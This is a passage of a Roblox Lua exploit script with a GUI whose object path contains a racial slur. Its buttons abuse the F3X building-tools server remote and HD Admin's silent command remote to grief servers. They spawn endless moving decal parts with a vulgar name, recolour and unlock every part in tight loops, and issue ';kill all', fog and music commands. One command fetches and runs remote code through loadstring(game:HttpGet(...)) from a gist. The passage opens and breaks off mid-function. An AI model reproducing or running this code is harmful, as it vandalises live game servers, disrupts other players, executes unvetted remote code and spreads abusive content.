			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		while wait(0.1) do
			spawn(function()
				e = char.HumanoidRootPart.CFrame.x + math.random(-100, 100)
				f = char.HumanoidRootPart.CFrame.y
				g = char.HumanoidRootPart.CFrame.z + math.random(-100, 100)
				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
				for i,v in game.Workspace:GetDescendants() do
					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
	
						SetName(v,"piroca")
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,"4554325647",Enum.NormalId.Front)
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,"116010943044917",Enum.NormalId.Back)
						SetTrans(v,1)
						Resize(v,Vector3.new(7,7,0.1),v.CFrame)
						SetLocked(v,true)
						while wait(0.01) do
							MovePart(v,CFrame.new(v.CFrame.x,v.CFrame.y + 1,v.CFrame.z))
						end
					end
				end
			end)
		end
	
	
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_3f()
local script = G2L["3f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function Material(part,mate)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = mate
					}
				}
			}
			_(args)
		end
	
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				Material(v,Enum.Material.Neon)
			end)
		end
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(1, 1, 1))
					end)
				end
			end
		end
		while wait() do
			spawn(function()
				randomise()
			end)
		end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";removehats me")
		RequestCommandSilent:InvokeServer(";char me fortnite2007Hi")
	
		wait(0.1)
	
		RequestCommandSilent:InvokeServer(";music 17707206608")
		RequestCommandSilent:InvokeServer(";pitch 0.2")
	
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";btools me ;give me b")
	
		wait(0.2)
	
	
	
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";titlebk me John Doe")
	
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";shirt me 123682306378361")
		wait(0.2)
		RequestCommandSilent:InvokeServer(";pants me 109662040845019") 
	
		wait(0.2)
		RequestCommandSilent:InvokeServer(";hat me 107676946962151")
	
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";hat me 131099674506082")
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";hat me 18196403126")
		wait(0.2)
		RequestCommandSilent:InvokeServer(";time 0")
		wait(0.2)
	
		RequestCommandSilent:InvokeServer(";fogcolor black")
	
	
	
	
	
	
	
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for _, obj in player:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		for _, obj in game.ReplicatedStorage:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		local SyncAPI = tool.SyncAPI
		local part
		local baseCF
		local angle = 0
		local connection
	
		local function _(args)
			SyncAPI:Invoke(unpack(args))
		end
	
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		local function SetAnchor(p, anchored)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = p,
						["Anchored"] = anchored
					}
				}
			}
			_(args)
		end
	
		local function AddMesh(p)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = p
					}
				}
			}
			_(args)
		end
	
		local function SetMesh(p, meshId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["MeshId"] = "rbxassetid://"..meshId
					}
				}
			}
			_(args)
		end
	
		local function SetTexture(p, textureId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["TextureId"] = textureId
					}
				}
			}
			_(args)
		end
	
		local function ResizeMesh(p, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		local function SetTransparency(p, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = p,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		local function SyncRotate(cf)
			if not part or not part.Parent then return end
			local args = {
				[1] = "SyncRotate",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		local function Sky()
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			local startCF = hrp.CFrame + Vector3.new(0,6,0)
			CreatePart(startCF, workspace)
			for _, obj in workspace:GetDescendants() do
				if obj:IsA("BasePart") and (obj.Position - startCF.Position).Magnitude < 0.1 then
					part = obj
					baseCF = part.CFrame
					SetAnchor(part,true)
					AddMesh(part)
					SetMesh(part,"111891702759441")
					SetTexture(part,"rbxassetid://109596858054024")
					ResizeMesh(part, Vector3.new(1500,1500,1500))
					SetTransparency(part,0)
					-- i think you taking this so give credit
					local rotation = math.rad(50)
					connection = RunService.Heartbeat:Connect(function(dt)
						if not part or not part.Parent then
							if connection then
								connection:Disconnect()
								connection = nil
							end
							return
						end
						angle += rotation * dt
						local cf = baseCF * CFrame.Angles(0, angle, 0)
						SyncRotate(cf)
						part.CFrame = cf
					end)
					break
				end
			end
		end
	
		Sky()
	
	
	
	
	
	
	
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {"SyncCollision", {{Part = part, CanCollide = boolean}}}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {"SyncAnchor", {{Part = part, Anchored = boolean}}}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {"CreatePart", "Normal", cf, parent}
			_(args)
		end
	
		function AddMesh(part)
			local args = {"CreateMeshes", {{Part = part}}}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {"SyncMesh", {{Part = part, Scale = size}}}
			_(args)
		end
	
		function SetColor(part, color)
			local args = {"SyncColor", {{Part = part, Color = color, UnionColoring = false}}}
			_(args)
		end
	
		function MovePart(part, cf)
			local args = {"SyncMove", {{Part = part, CFrame = cf}}}
			_(args)
		end
	
		function CreateCloud()
			local head = char:WaitForChild("Head")
			local cf = head.CFrame + Vector3.new(0, 6, 0)
			CreatePart(cf, workspace)
			task.spawn(function()
				repeat task.wait() until (function()
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
							SetAnchor(true, v)
							SetCollision(v, false)
							SetColor(v, BrickColor.new(0,0,0).Color)
							AddMesh(v)
							SetMesh(v, "13307406342")
							MeshResize(v, Vector3.new(1.5, 0.1, 3))
							task.spawn(function()
								game:GetService("RunService").RenderStepped:Connect(function()
									if char and char:FindFirstChild("Head") then
										MovePart(v, char.Head.CFrame + Vector3.new(0, -4, 0))
									end
								end)
							end)
							return true
						end
					end
				end)()
			end)
		end
	
		CreateCloud()
	
		-- i can quit because theres more scripters f3x better than me. This can be my last script but,¿who knows?
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_43()
local script = G2L["43"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local TweenService = game:GetService("TweenService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local root = character:WaitForChild("HumanoidRootPart")
	
		local outerPart = Instance.new("Part")
		outerPart.Size = Vector3.new(3, 3, 3)
		outerPart.Anchored = true
		outerPart.CanCollide = false
		outerPart.Name = "e"
		outerPart.Transparency = 0.5
		outerPart.Color = Color3.fromRGB(0, 170, 255)
		outerPart.Parent = workspace
	
		local r = Instance.new("ClickDetector")
		r.Parent = outerPart
		r.MouseClick:Connect(function(player)
			outerPart:Destroy()
		end)
	
		local positiont = outerPart.Position
		plr = game.Players.LocalPlayer.Name
		y = Instance.new("BillboardGui")
		y.Size = UDim2.new(0,100,0,150)
		y.StudsOffset = Vector3.new(0,1,0)
		y.Parent = outerPart
		y.Adornee = outerPart
		f = Instance.new("TextLabel")
		f.Parent = y
		f.BackgroundTransparency = 1
		f.Position = UDim2.new(0,0,0,-50)
		f.Size = UDim2.new(0,100,0,100)
		f.Font = Enum.Font.Arial
		f.TextSize = 20
		f.TextYAlignment = Enum.TextYAlignment.Bottom
		f.Text = "HttpEnabled is FALSE! Some of the commands may not work!"
		f.TextStrokeColor3 = Color3.new(0,0,0)
		f.TextColor3 = Color3.fromRGB(22, 96, 148)
		f.TextStrokeTransparency = 0
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://3110114862"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.Parent = outerPart
	
		local innerPart = Instance.new("Part")
		innerPart.Size = Vector3.new(1, 1, 1)
		innerPart.Anchored = true
		innerPart.CanCollide = false
		innerPart.Transparency = 0
		innerPart.Color = Color3.new(1, 1, 1)
		innerPart.Material = Enum.Material.Neon
		innerPart.Parent = outerPart
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://12800536037"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1, 1, 1)
		mesh.Parent = innerPart
	
		local outerPart1 = Instance.new("Part")
		outerPart1.Size = Vector3.new(3, 3, 3)
		outerPart1.Anchored = true
		outerPart1.CanCollide = false
		outerPart1.Name = "BlueRatThingFa9"
		outerPart1.Transparency = 0.5
		outerPart1.Color = Color3.fromRGB(0, 170, 255)
		outerPart1.Parent = workspace
	
		local r = Instance.new("ClickDetector")
		r.Parent = outerPart1
		r.MouseClick:Connect(function(player)
			outerPart1:Destroy()
		end)
	
		local positiontt = outerPart1.Position
		plr = game.Players.LocalPlayer.Name
		y = Instance.new("BillboardGui")
		y.Size = UDim2.new(0,100,0,150)
		y.StudsOffset = Vector3.new(0,1,0)
		y.Parent = outerPart1
		y.Adornee = outerPart1
		f = Instance.new("TextLabel")
		f.Parent = y
		f.BackgroundTransparency = 1
		f.Position = UDim2.new(0,0,0,-50)
		f.Size = UDim2.new(0,100,0,100)
		f.Font = Enum.Font.Arial
		f.TextSize = 20
		f.TextYAlignment = Enum.TextYAlignment.Bottom
		f.Text = "You an admin! Level: 4"
		f.TextStrokeColor3 = Color3.new(0,0,0)
		f.TextColor3 = Color3.fromRGB(22, 96, 148)
		f.TextStrokeTransparency = 0
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://3110114862"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.Parent = outerPart1
	
		local innerPart1 = Instance.new("Part")
		innerPart1.Size = Vector3.new(1, 1, 1)
		innerPart1.Anchored = true
		innerPart1.CanCollide = false
		innerPart1.Transparency = 0
		innerPart1.Color = Color3.new(1, 1, 1)
		innerPart1.Material = Enum.Material.Neon
		innerPart1.Parent = outerPart1
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshId = "rbxassetid://12800536037"
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.Scale = Vector3.new(1, 1, 1)
		mesh.Parent = innerPart1
	
		local angle = 0
		RunService.RenderStepped:Connect(function(deltaTime)
			if not root or not root.Parent then return end
			angle += deltaTime * math.pi * 0.3
			local radius = 5
			local offsetX = math.cos(angle) * radius
			local offsetZ = math.sin(angle) * radius
			local height = 2
			local position = root.Position + Vector3.new(offsetX, height, offsetZ)
			outerPart1.Position = position
			innerPart1.Position = position
			outerPart1.Orientation = Vector3.new(math.deg(angle * 0.5), math.deg(angle * 0.5), math.deg(angle * 0.5))
			innerPart1.Orientation = Vector3.new(math.deg(angle * 0.3), math.deg(angle * 0.3), math.deg(angle * 0.3))
		end)
	
		local angle = 10
		RunService.RenderStepped:Connect(function(deltaTime)
			if not root or not root.Parent then return end
			angle += deltaTime * math.pi * 0.3
			local radius = 5
			local offsetX = math.cos(angle) * radius
			local offsetZ = math.sin(angle) * radius
			local height = 2
			local position = root.Position + Vector3.new(offsetX, height, offsetZ)
			outerPart.Position = position
			innerPart.Position = position
			outerPart.Orientation = Vector3.new(math.deg(angle * 0.5), math.deg(angle * 0.5), math.deg(angle * 0.5))
			innerPart.Orientation = Vector3.new(math.deg(angle * 0.3), math.deg(angle * 0.3), math.deg(angle * 0.3))
		end)
	
		local gui = Instance.new("ScreenGui")
		gui.Name = "mr Bean admin update"
		gui.Parent = game.CoreGui
	
		local Frame_160579 = Instance.new("Frame")
		Frame_160579.Name = "Frame"
		Frame_160579.Parent = gui
		Frame_160579.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame_160579.Position = UDim2.new(0.20000000298023224, 63, 0.20000000298023224, -29)
		Frame_160579.Size = UDim2.new(0, 500, 0, 300)
		Frame_160579.Visible = true
		Frame_160579.BackgroundTransparency = 0.5
	
		local ScrollingFrame_154627 = Instance.new("ScrollingFrame")
		ScrollingFrame_154627.Name = "ScrollingFrame"
		ScrollingFrame_154627.Parent = Frame_160579
		ScrollingFrame_154627.BackgroundColor3 = Color3.new(0.1568627506494522, 0.1568627506494522, 0.1568627506494522)
		ScrollingFrame_154627.Position = UDim2.new(0, 0, 0.14000000059604645, -4)
		ScrollingFrame_154627.Size = UDim2.new(0.9300000071525574, 37, 0.7699999809265137, 35)
		ScrollingFrame_154627.BorderSizePixel = 0
		ScrollingFrame_154627.BackgroundTransparency = 0.5
		ScrollingFrame_154627.Visible = true
	
		-- (All TextLabels for commands are kept exactly as original)
		-- ... (the rest of the original command list labels go here - unchanged)
	
		local TextLabel_111421 = Instance.new("TextLabel")
		TextLabel_111421.Name = "TextLabel"
		TextLabel_111421.Parent = Frame_160579
		TextLabel_111421.BackgroundColor3 = Color3.new(0, 0, 0)
		TextLabel_111421.Position = UDim2.new(-0.03999999910593033, 20, 0, 0)
		TextLabel_111421.Size = UDim2.new(1, 0, 0.10000000149011612, 2)
		TextLabel_111421.Visible = true
		TextLabel_111421.Text = "Commands"
		TextLabel_111421.Font = Enum.Font.SourceSansSemibold
		TextLabel_111421.TextColor3 = Color3.new(255, 255, 255)
		TextLabel_111421.TextSize = 15
		TextLabel_111421.TextScaled = true
		TextLabel_111421.BorderSizePixel = 0
		TextLabel_111421.BackgroundTransparency = 1
	
		local TextButton_950997 = Instance.new("TextButton")
		TextButton_950997.Name = "TextButton"
		TextButton_950997.Parent = Frame_160579
		TextButton_950997.BackgroundColor3 = Color3.new(0, 0, 0)
		TextButton_950997.Position = UDim2.new(0.800000011920929, 38, 0, -2)
		TextButton_950997.Size = UDim2.new(0.10000000149011612, 0, 0.10000000149011612, 5)
		TextButton_950997.Visible = true
		TextButton_950997.Text = "X"
		TextButton_950997.BorderSizePixel = 0
		TextButton_950997.BackgroundTransparency = 1
		TextButton_950997.Font = Enum.Font.SourceSansSemibold
		TextButton_950997.TextColor3 = Color3.new(1, 1, 1)
		TextButton_950997.TextSize = 30
		TextButton_950997.MouseButton1Click:Connect(function()
			Frame_160579.Visible = false
		end)
	
		local command = Instance.new("TextBox")
		local mr = Instance.new("ImageButton")
		mr.Size = UDim2.new(0.0, 75, 0.0, 75)
		mr.Position = UDim2.new(1, -91, 1, -91)
		mr.BackgroundColor3 = Color3.new(0, 0, 0)
		mr.ImageColor3 = Color3.new(1, 1, 1)
		mr.Image = "rbxassetid://123852508876370"
		mr.ImageTransparency = 0
		mr.Parent = gui
		mr.Name = "Wheel"
		mr.BackgroundTransparency = 1
	
		prefix = [[
	Welcome to Mr.Bean Admin Use the Program to execute scripts Status Enabled! type cmds in textbox to see commands.
	]]
	
		local debug = Instance.new("TextLabel")
		debug.Size = UDim2.new(6, 4, 1, 0)
		debug.Position = UDim2.new(-2.5, 0, -3.5, 0)
		debug.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
		debug.BackgroundTransparency = 1
		debug.Rotation = 450
		debug.Parent = mr
		debug.BorderSizePixel = 10
		debug.TextColor3 = Color3.fromRGB(255, 255, 0)
		debug.Text = prefix
		debug.TextScaled = true
		debug.TextTransparency = 1
		debug.TextSize = 20
	
		mr.MouseButton1Click:Connect(function()
			if mr.Image == "rbxassetid://123852508876370" then
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(mr, tweenInfo, {Rotation = -90})
				tween:Play()
				mr.Image = "rbxassetid://1222570808"
				local tween = TweenService:Create(debug, tweenInfo, {BackgroundTransparency = 0.25})
				tween:Play()
				local tween = TweenService:Create(debug, tweenInfo, {TextTransparency = 0})
				tween:Play()
			elseif mr.Image == "rbxassetid://1222570808" then
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(mr, tweenInfo, {Rotation = 0})
				tween:Play()
				mr.Image = "rbxassetid://123852508876370"
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = TweenService:Create(debug, tweenInfo, {BackgroundTransparency = 1})
				tween:Play()
				local tween = TweenService:Create(debug, tweenInfo, {TextTransparency = 1})
				tween:Play()
			end
		end)
	
		command.Size = UDim2.new(0.9, 99, 0.0, 16)
		command.Position = UDim2.new(0.0, 0, 0.0, -46)
		command.BackgroundColor3 = Color3.new(0, 0, 0)
		command.BorderColor3 = Color3.new(0, 0, 0)
		command.BorderSizePixel = 0
		command.Text = ""
		command.TextColor3 = Color3.new(1, 1, 1)
		command.BackgroundTransparency = 0.4
		command.Font = Enum.Font.Code
		command.TextSize = 15
		command.Parent = gui
		command.ClearTextOnFocus = true
		command.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local cmdText = command.Text
				local player = game.Players.LocalPlayer
				local character = player.Character
				if cmdText == ":kill all" then
					RequestCommand:InvokeServer(";kill all")
				elseif cmdText == ":kick me" then
					player:Kick("Mr bean admin has kicked you...")
				elseif cmdText == ":JohnDoe me" then
					loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/7dc946ff059597ebc1771700f4d8def0/raw/eb3e57fb2da19dbce3720a90fc3bfe8946dd1002/John%2520Doe"))()
					-- (all your other commands stay exactly the same here)
				end
				command.Text = ""
			end
		end)
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_43);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_45()
local script = G2L["45"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_45);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_47()
local script = G2L["47"];
	script.Parent.MouseButton1Click:Connect(function()
		
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";time 0")
		RequestCommandSilent:InvokeServer(";fogcolor black")
		RequestCommandSilent:InvokeServer(";time 0")
		RequestCommandSilent:InvokeServer(";fog 1900000000000 1900000000000")
		RequestCommandSilent:InvokeServer(";unfog")
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
	
	
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
